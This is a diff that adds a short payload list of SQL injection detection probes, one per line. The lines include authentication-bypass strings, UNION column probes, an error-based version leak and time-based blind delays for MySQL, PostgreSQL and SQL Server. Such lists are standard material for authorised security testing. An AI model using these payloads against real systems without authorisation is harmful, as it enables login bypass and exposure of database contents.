@@ -1,0 +1,21 @@
+## SQL injection - detection probes (non-destructive). One payload per line; lines starting with ## are comments.
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+' OR 1=1--
+') OR ('1'='1
+admin'--
+admin' #
+' OR ''='
+1 OR 1=1
+1' ORDER BY 10--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL,NULL--
+'; SELECT 1;--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND SLEEP(5)--
+1; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '0:0:5'--
+%27%20OR%20%271%27%3D%271
